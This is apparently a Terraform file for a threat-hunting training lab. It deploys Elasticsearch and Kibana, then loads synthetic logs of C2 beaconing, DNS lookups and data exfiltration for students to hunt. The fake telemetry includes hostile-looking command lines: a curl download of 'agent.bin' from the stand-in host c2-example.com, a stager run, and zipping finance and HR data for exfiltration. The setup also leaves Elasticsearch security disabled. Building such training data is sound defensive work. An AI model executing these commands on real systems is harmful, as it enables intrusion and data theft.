# ============================================================================
# Threat Hunting Lab 2 — Beacon and Exfiltration Hunt
# Terraform: 1x GCE VM running Elasticsearch + Kibana (via Docker) + Nginx Basic Auth
# Datasets generated (last 72h):
#   - network-flow-*          (beaconing + large exfil transfer + noise)
#   - dns-logs-*              (c2-example.com + subdomains + noise)
#   - workload-telemetry-*    (curl/wget/python/tar/zip + archive creation + noise)
#   - cloud-storage-audit-*   (storage.objects.insert for archive + noise)
# Also creates Kibana Data Views automatically.
# ============================================================================

resource "random_id" "lab_user_suffix" {
  byte_length = 3
}

locals {
  lab_user = "lab-${random_id.lab_user_suffix.hex}"
}

resource "random_password" "lab_pass" {
  length  = 16
  special = false
}

resource "google_compute_firewall" "allow_http" {
  name      = "allow-http"
  network   = "default"
  direction = "INGRESS"

  allow {
    protocol = "tcp"
    ports    = ["80"]
  }

  source_ranges = ["0.0.0.0/0"]
  target_tags   = ["thl-beacon-lab"]
}

resource "google_compute_instance" "thl_beacon_lab" {
  name         = "thl-beacon-lab"
  project      = var.gcp_project_id
  machine_type = "e2-standard-4"
  zone         = var.gcp_zone
  tags         = ["thl-beacon-lab"]

  boot_disk {
    initialize_params {
      image = "ubuntu-os-cloud/ubuntu-2204-lts"
      size  = 50
      type  = "pd-balanced"
    }
  }

  network_interface {
    network = "default"
    access_config {}
  }

  metadata_startup_script = <<-EOF
#!/usr/bin/env bash
set -euo pipefail

exec > >(tee -a /var/log/startup-script.log) 2>&1
echo "[+] Startup script begin: $(date -Is)"
trap 'echo "[!] ERROR at line $LINENO. Last command: $BASH_COMMAND"' ERR

export DEBIAN_FRONTEND=noninteractive
sleep 20

retry() {
  local n=0
  local max=10
  local delay=5
  until "$@"; do
    n=$((n+1))
    if [ "$n" -ge "$max" ]; then
      echo "[!] Command failed after $n attempts: $*"
      return 1
    fi
    echo "[!] Command failed: $*. Retrying in $${delay}s..."
    sleep "$delay"
  done
}

echo "[+] Updating apt (with retries)"
retry apt-get update -y

# --- Credentials injected from Terraform ---
LAB_USER="${local.lab_user}"
LAB_PASS="${random_password.lab_pass.result}"
echo "[+] Generated lab creds: $${LAB_USER} / (hidden)"

mkdir -p /opt/lab
chmod 755 /opt/lab
printf "Kibana Basic Auth\nUsername: %s\nPassword: %s\n" "$LAB_USER" "$LAB_PASS" > /opt/lab/creds.txt
chmod 600 /opt/lab/creds.txt

echo "[+] Installing dependencies"
retry apt-get install -y ca-certificates curl gnupg apache2-utils jq python3

echo "[+] Installing Docker Engine (official repo)"
install -m 0755 -d /etc/apt/keyrings
retry bash -c "curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg"
chmod a+r /etc/apt/keyrings/docker.gpg

cat >/etc/apt/sources.list.d/docker.list <<'DOCKERLIST'
deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu jammy stable
DOCKERLIST

retry apt-get update -y
retry apt-get install -y docker-ce docker-ce-cli containerd.io
systemctl enable --now docker
docker --version

echo "[+] Installing docker-compose v1 (binary)"
retry curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose
/usr/local/bin/docker-compose version || true

echo "[+] Preparing /opt/lab"
rm -rf /opt/lab/{nginx,bulk,scripts} || true
mkdir -p /opt/lab/{nginx,bulk,scripts}
chmod -R 777 /opt/lab/bulk
cd /opt/lab

echo "[+] Creating htpasswd file"
htpasswd -bc /opt/lab/nginx/.htpasswd "$LAB_USER" "$LAB_PASS"

echo "[+] Writing nginx.conf"
tee /opt/lab/nginx/nginx.conf >/dev/null <<'NGINX'
events {}
http {
  upstream kibana_upstream { server kibana:5601; }

  server {
    listen 80;
    server_name _;

    auth_basic "Threat Hunting Lab";
    auth_basic_user_file /etc/nginx/.htpasswd;

    location / {
      proxy_pass http://kibana_upstream;
      proxy_set_header Host $host;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
    }
  }
}
NGINX

echo "[+] Writing docker-compose.yml"
tee /opt/lab/docker-compose.yml >/dev/null <<'YAML'
version: "3.8"
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.13.4
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - ES_JAVA_OPTS=-Xms2g -Xmx2g
    volumes:
      - esdata:/usr/share/elasticsearch/data
    networks: [labnet]

  kibana:
    image: docker.elastic.co/kibana/kibana:8.13.4
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    depends_on: [elasticsearch]
    networks: [labnet]

  nginx:
    image: nginx:1.27-alpine
    depends_on: [kibana]
    ports:
      - "80:80"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
      - ./nginx/.htpasswd:/etc/nginx/.htpasswd:ro
    networks: [labnet]

networks:
  labnet:

volumes:
  esdata:
YAML

echo "[+] Starting the stack"
docker-compose up -d
docker ps

###############################################################################
# Step — Generate Lab 2 datasets (last 72h) + BULK NDJSON
###############################################################################
echo "[+] Generating Lab 2 datasets (last 72h) and BULK NDJSON"

tee /opt/lab/scripts/generate_bulk.py >/dev/null <<'PY'
import json, random, string
from datetime import datetime, timedelta, timezone
from pathlib import Path

random.seed(42)

OUT_DIR = Path("/opt/lab/bulk")
OUT_DIR.mkdir(parents=True, exist_ok=True)

NOW = datetime.now(timezone.utc)
START = NOW - timedelta(hours=72)

def iso(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def index_name(prefix: str, dt: datetime) -> str:
    return f"{prefix}-{dt.strftime('%Y.%m.%d')}"

def write_bulk(path: Path, records):
    with path.open("w", encoding="utf-8") as f:
        for idx, doc in records:
            f.write(json.dumps({"index": {"_index": idx}}) + "\n")
            f.write(json.dumps(doc) + "\n")

def rand_dt():
    delta = NOW - START
    return START + timedelta(seconds=random.randint(0, int(delta.total_seconds())))

# -----------------------------
# Entities / look & feel
# -----------------------------
HOSTS = ["GCE-WEB-01", "GCE-APP-02", "GCE-DB-01", "K8S-NODE-01", "K8S-NODE-02"]
COMPROMISED_HOST = "GCE-APP-02"
SRC_PRIVATE_IPS = ["10.10.2.11", "10.10.2.12", "10.10.2.21", "10.10.3.31", "10.10.3.41"]
SRC_PRIVATE_IP_COMP = "10.10.2.21"

USERS = [
    {"email":"svc-app@corp.com","role":"service_account"},
    {"email":"svc-backup@corp.com","role":"service_account"},
    {"email":"alice@corp.com","role":"user"},
    {"email":"bob@corp.com","role":"poweruser"},
    {"email":"eve@corp.com","role":"admin"},
]

# External infra
C2_DOMAIN = "c2-example.com"
C2_IPS = ["203.0.113.77", "198.51.100.23"]
CLOUD_STORAGE_IPS = ["34.120.10.10", "34.95.20.20"]  # looks like public cloud ranges

IPS_CA = ["24.48.123.11","99.230.11.7","142.112.88.9","70.50.146.28","34.95.10.22"]
IPS_WORLD = ["51.158.91.22","91.198.174.192","101.89.33.17","185.220.101.1","3.221.14.9"]
GEO = {
    "24.48.123.11": ("Canada","Montreal"),
    "99.230.11.7": ("Canada","Toronto"),
    "142.112.88.9": ("Canada","Quebec"),
    "70.50.146.28": ("Canada","Beauharnois"),
    "34.95.10.22": ("Canada","Ottawa"),
    "51.158.91.22": ("France","Paris"),
    "91.198.174.192": ("Russia","Moscow"),
    "101.89.33.17": ("China","Beijing"),
    "185.220.101.1": ("Germany","Frankfurt"),
    "3.221.14.9": ("United States","Ashburn"),
}

def geo(ip):
    c, city = GEO.get(ip, ("Unknown","Unknown"))
    return {"country_name": c, "city_name": city}

def rand_ua():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "curl/8.5.0",
    ])

def high_entropy_label(n=12):
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(n))

# -----------------------------
# NETWORK FLOW LOGS
# Fields aligned to your lab queries:
#   network.direction, bytes_out, destination.ip, destination.domain, @timestamp
# -----------------------------
net_records = []

# Noise: normal outbound traffic (mix small + medium) from multiple hosts
for _ in range(1400):
    dt = rand_dt()
    host = random.choice(HOSTS)
    src_priv = random.choice(SRC_PRIVATE_IPS)
    dst_ip = random.choice(CLOUD_STORAGE_IPS + C2_IPS + IPS_CA + IPS_WORLD)
    dst_domain = random.choice([
        "update.ubuntu.com",
        "packages.elastic.co",
        "api.github.com",
        "storage.googleapis.com",
        "login.microsoftonline.com",
        "cdn.cloudflare.com",
    ])
    bytes_out = random.randint(200, 200000)
    doc = {
        "@timestamp": iso(dt),
        "event": {"dataset":"network_flow", "action":"flow", "outcome":"success"},
        "network": {"direction":"outbound", "transport": random.choice(["tcp","udp"]), "protocol":"ip"},
        "source": {"ip": src_priv},
        "destination": {"ip": dst_ip, "domain": dst_domain, "port": random.choice([53,80,443,8080,8443])},
        "bytes_out": bytes_out,
        "bytes_in": random.randint(200, 50000),
        "device": {"name": host},
    }
    net_records.append((index_name("network-flow", dt), doc))

# Signal 1: C2 beaconing — periodic, low-volume, stable dst domain
# Every 5 minutes for ~8 hours with slight jitter; bytes_out < 5000
beacon_start = NOW - timedelta(hours=18)
beacon_end = NOW - timedelta(hours=10)
t = beacon_start
while t <= beacon_end:
    jitter = random.randint(-20, 20)  # seconds
    dt = t + timedelta(seconds=jitter)
    dst_ip = random.choice(C2_IPS)
    doc = {
        "@timestamp": iso(dt),
        "event": {"dataset":"network_flow", "action":"flow", "outcome":"success"},
        "network": {"direction":"outbound", "transport":"tcp", "protocol":"ip"},
        "source": {"ip": SRC_PRIVATE_IP_COMP},
        "destination": {"ip": dst_ip, "domain": C2_DOMAIN, "port": 443},
        "bytes_out": random.randint(600, 2800),   # low-volume
        "bytes_in": random.randint(400, 2200),
        "device": {"name": COMPROMISED_HOST},
        "rule": {"name":"c2_beacon_candidate"},
    }
    net_records.append((index_name("network-flow", dt), doc))
    t += timedelta(minutes=5)

# Signal 2: Large outbound transfer (exfil) — bytes_out > 5,000,000
# Happens shortly after archive creation (we'll align in workload telemetry)
exfil_dt = NOW - timedelta(hours=9, minutes=42)
exfil_dst_ip = random.choice(CLOUD_STORAGE_IPS)
doc_exfil = {
    "@timestamp": iso(exfil_dt),
    "event": {"dataset":"network_flow", "action":"flow", "outcome":"success"},
    "network": {"direction":"outbound", "transport":"tcp", "protocol":"ip"},
    "source": {"ip": SRC_PRIVATE_IP_COMP},
    "destination": {"ip": exfil_dst_ip, "domain": "storage.googleapis.com", "port": 443},
    "bytes_out": random.randint(6_500_000, 18_000_000),
    "bytes_in": random.randint(50_000, 200_000),
    "device": {"name": COMPROMISED_HOST},
    "rule": {"name":"suspected_exfil_large_transfer"},
}
net_records.append((index_name("network-flow", exfil_dt), doc_exfil))

# -----------------------------
# DNS LOGS
# Fields aligned to your lab queries:
#   dns.question.name, source.ip, @timestamp, geo.country_name
# -----------------------------
dns_records = []

# Noise: common DNS queries
COMMON_DOMAINS = [
    "google.com", "gstatic.com", "github.com", "microsoft.com",
    "ubuntu.com", "elastic.co", "cloudflare.com", "example.org"
]
for _ in range(1200):
    dt = rand_dt()
    src_ip = random.choice(SRC_PRIVATE_IPS)
    qname = random.choice(COMMON_DOMAINS + [f"api.{d}" for d in COMMON_DOMAINS])
    doc = {
        "@timestamp": iso(dt),
        "event": {"dataset":"dns", "action":"query", "outcome":"success"},
        "dns": {"question": {"name": qname, "type": random.choice(["A","AAAA","CNAME"])}},
        "source": {"ip": src_ip},
        "geo": geo(random.choice(IPS_CA)),  # internal DNS: keep geo "Canada-like"
        "device": {"name": random.choice(HOSTS)},
    }
    dns_records.append((index_name("dns-logs", dt), doc))

# Signal: repeated DNS to c2-example.com + subdomains aligned with beacon window
t = beacon_start - timedelta(minutes=10)
while t <= beacon_end + timedelta(minutes=10):
    dt = t + timedelta(seconds=random.randint(-15, 15))
    # mix root domain + subdomains (some high entropy)
    if random.random() < 0.35:
        qname = C2_DOMAIN
    else:
        label = high_entropy_label(10) if random.random() < 0.6 else random.choice(["cdn","img","api","status","telemetry"])
        qname = f"{label}.{C2_DOMAIN}"
    doc = {
        "@timestamp": iso(dt),
        "event": {"dataset":"dns", "action":"query", "outcome":"success"},
        "dns": {"question": {"name": qname, "type":"A"}},
        "source": {"ip": SRC_PRIVATE_IP_COMP},
        "geo": geo("34.95.10.22"),  # Canada-like
        "device": {"name": COMPROMISED_HOST},
        "rule": {"name":"dns_c2_domain_candidate"},
    }
    dns_records.append((index_name("dns-logs", dt), doc))
    t += timedelta(minutes=3)

# -----------------------------
# WORKLOAD TELEMETRY (process)
# Fields aligned to your lab queries:
#   process.name, (optional) process.command_line, file.name, @timestamp
# -----------------------------
workload_records = []

# Noise: routine processes
NOISE_PROCS = ["systemd", "sshd", "cron", "dockerd", "kubelet", "nginx", "java", "python", "bash"]
for _ in range(1100):
    dt = rand_dt()
    host = random.choice(HOSTS)
    proc = random.choice(NOISE_PROCS)
    doc = {
        "@timestamp": iso(dt),
        "event": {"dataset":"workload", "action":"process_start", "outcome":"success"},
        "process": {"name": proc, "pid": random.randint(100, 50000)},
        "user": {"name": random.choice(["root","ubuntu","app","elastic","www-data"])},
        "device": {"name": host},
    }
    workload_records.append((index_name("workload-telemetry", dt), doc))

# Signal: tool usage + staging on compromised host (curl/wget/python/tar/zip)
staging_start = NOW - timedelta(hours=10, minutes=5)

# 1) tool download
dt_tool = staging_start
doc_tool = {
    "@timestamp": iso(dt_tool),
    "event": {"dataset":"workload", "action":"process_start", "outcome":"success"},
    "process": {"name":"curl", "command_line": "curl -sS https://c2-example.com/tools/agent.bin -o /tmp/agent.bin"},
    "user": {"name":"ubuntu"},
    "device": {"name": COMPROMISED_HOST},
    "rule": {"name":"suspicious_tool_download"},
}
workload_records.append((index_name("workload-telemetry", dt_tool), doc_tool))

# 2) python execution (stager)
dt_py = staging_start + timedelta(minutes=7)
doc_py = {
    "@timestamp": iso(dt_py),
    "event": {"dataset":"workload", "action":"process_start", "outcome":"success"},
    "process": {"name":"python", "command_line": "python3 /tmp/stage.py --collect /srv/data --out /tmp/stage"},
    "user": {"name":"ubuntu"},
    "device": {"name": COMPROMISED_HOST},
    "rule": {"name":"suspicious_stager_execution"},
}
workload_records.append((index_name("workload-telemetry", dt_py), doc_py))

# 3) archive creation (zip or tar) — align just before large transfer
ARCHIVE_NAME = "finance-exports-2026-02-archive.zip"
dt_zip = exfil_dt - timedelta(minutes=6)  # archive shortly before large outbound transfer
doc_zip = {
    "@timestamp": iso(dt_zip),
    "event": {"dataset":"workload", "action":"process_start", "outcome":"success"},
    "process": {"name":"zip", "command_line": f"zip -r /tmp/{ARCHIVE_NAME} /srv/data/finance /srv/data/hr"},
    "file": {"name": f"/tmp/{ARCHIVE_NAME}", "extension":"zip"},
    "user": {"name":"ubuntu"},
    "device": {"name": COMPROMISED_HOST},
    "rule": {"name":"data_staging_archive_creation"},
}
workload_records.append((index_name("workload-telemetry", dt_zip), doc_zip))

# -----------------------------
# CLOUD STORAGE AUDIT LOGS
# Fields aligned to your lab queries:
#   event.action:"storage.objects.insert", object.name, actor.email, @timestamp
# -----------------------------
cs_records = []

# Noise: storage reads/list
for _ in range(450):
    dt = rand_dt()
    actor = random.choice(USERS)["email"]
    action = random.choice(["storage.objects.get","storage.objects.list","storage.buckets.get"])
    doc = {
        "@timestamp": iso(dt),
        "event": {"dataset":"cloud_storage_audit", "action": action, "outcome":"success"},
        "actor": {"email": actor},
        "bucket": {"name": random.choice(["corp-logs-bucket","corp-app-bucket","corp-backups-bucket"])},
        "object": {"name": random.choice(["logs/2026/02/24.log","app/config.yaml","backups/db.bak"])},
        "source": {"ip": random.choice(IPS_CA)},
        "geo": geo(random.choice(IPS_CA)),
    }
    cs_records.append((index_name("cloud-storage-audit", dt), doc))

# Signal: exfil upload via storage.objects.insert
# Align shortly after large outbound transfer
upload_dt = exfil_dt + timedelta(minutes=2)
doc_upload = {
    "@timestamp": iso(upload_dt),
    "event": {"dataset":"cloud_storage_audit", "action":"storage.objects.insert", "outcome":"success"},
    "actor": {"email":"svc-app@corp.com"},
    "bucket": {"name":"attacker-exfil-bucket"},
    "object": {"name": f"exfil/{ARCHIVE_NAME}"},
    "source": {"ip":"3.221.14.9"},
    "geo": geo("3.221.14.9"),
    "device": {"name": COMPROMISED_HOST},
    "rule": {"name":"confirmed_exfil_to_cloud_storage"},
}
cs_records.append((index_name("cloud-storage-audit", upload_dt), doc_upload))

# -----------------------------
# Write BULK files
# -----------------------------
write_bulk(OUT_DIR / "network-flow.bulk.ndjson", net_records)
write_bulk(OUT_DIR / "dns-logs.bulk.ndjson", dns_records)
write_bulk(OUT_DIR / "workload-telemetry.bulk.ndjson", workload_records)
write_bulk(OUT_DIR / "cloud-storage-audit.bulk.ndjson", cs_records)

print("BULK generated:")
for p in sorted(OUT_DIR.glob("*.ndjson")):
    print(" -", p, p.stat().st_size, "bytes")
PY

python3 /opt/lab/scripts/generate_bulk.py
ls -lh /opt/lab/bulk || true

# Find ES container dynamically
ES_CID="$(docker ps --format '{{.ID}} {{.Names}}' | awk '$2 ~ /elasticsearch/ {print $1; exit}')"
if [ -z "$ES_CID" ]; then
  echo "[!] Could not find Elasticsearch container"
  docker ps
  exit 10
fi
echo "[+] Elasticsearch container ID: $ES_CID"

echo "[+] Waiting for Elasticsearch readiness"
for i in {1..240}; do
  if docker exec -i "$ES_CID" curl -s http://localhost:9200 >/dev/null 2>&1; then
    echo "[+] Elasticsearch is ready"
    break
  fi
  sleep 2
done

echo "[+] Bulk importing into Elasticsearch"
for f in /opt/lab/bulk/*.ndjson; do
  echo "[+] Loading $f ..."
  err=$(docker exec -i "$ES_CID" \
    curl -s -H "Content-Type: application/x-ndjson" \
    -XPOST "http://localhost:9200/_bulk?refresh=true" \
    --data-binary @- < "$f" | jq -r '.errors')
  echo "[+] errors=$err"
  if [[ "$err" != "false" ]]; then
    echo "[!] Bulk import returned errors for $f"
    exit 20
  fi
done

echo "[+] Verifying indices"
docker exec -i "$ES_CID" curl -s "http://localhost:9200/_cat/indices?v" || true

###############################################################################
# Create Kibana Data Views via API (through Nginx + Basic Auth)
###############################################################################
echo "[+] Waiting for Kibana API through Nginx (http://localhost/api/status)"
for i in {1..300}; do
  code=$(curl -s -u "$LAB_USER:$LAB_PASS" -o /dev/null -w "%%{http_code}" http://localhost/api/status || true)
  if [[ "$code" == "200" ]]; then
    echo "[+] Kibana API is ready"
    break
  fi
  sleep 2
done

create_data_view() {
  local name="$1"
  local pattern="$2"

  resp=$(curl -s -u "$LAB_USER:$LAB_PASS" -w "\n%%{http_code}\n" \
    -X POST "http://localhost/api/data_views/data_view" \
    -H "Content-Type: application/json" \
    -H "kbn-xsrf: true" \
    -d "{
      \"data_view\": {
        \"title\": \"$${pattern}\",
        \"name\": \"$${name}\",
        \"timeFieldName\": \"@timestamp\"
      }
    }")

  body=$(echo "$resp" | sed '$d')
  http=$(echo "$resp" | tail -n 1)

  if [[ "$http" == "200" || "$http" == "201" || "$http" == "409" ]]; then
    echo "[+] Data view OK: $${name} -> $${pattern} (HTTP=$http)"
    return 0
  fi

  echo "[!] Failed to create data view $${name} ($${pattern}) HTTP=$http"
  echo "$body" | head -n 120
  return 1
}

# Data views required by Lab 2
create_data_view "network-flow" "network-flow-*"
create_data_view "dns-logs" "dns-logs-*"
create_data_view "workload-telemetry" "workload-telemetry-*"
create_data_view "cloud-storage-audit" "cloud-storage-audit-*"

echo "[+] Listing data views (name -> pattern)"
curl -s -u "$LAB_USER:$LAB_PASS" -H "kbn-xsrf: true" http://localhost/api/data_views \
  | jq -r '.data_view[] | "\(.name) -> \(.title)"' || true

echo "[+] Startup script completed successfully: $(date -Is)"
EOF
}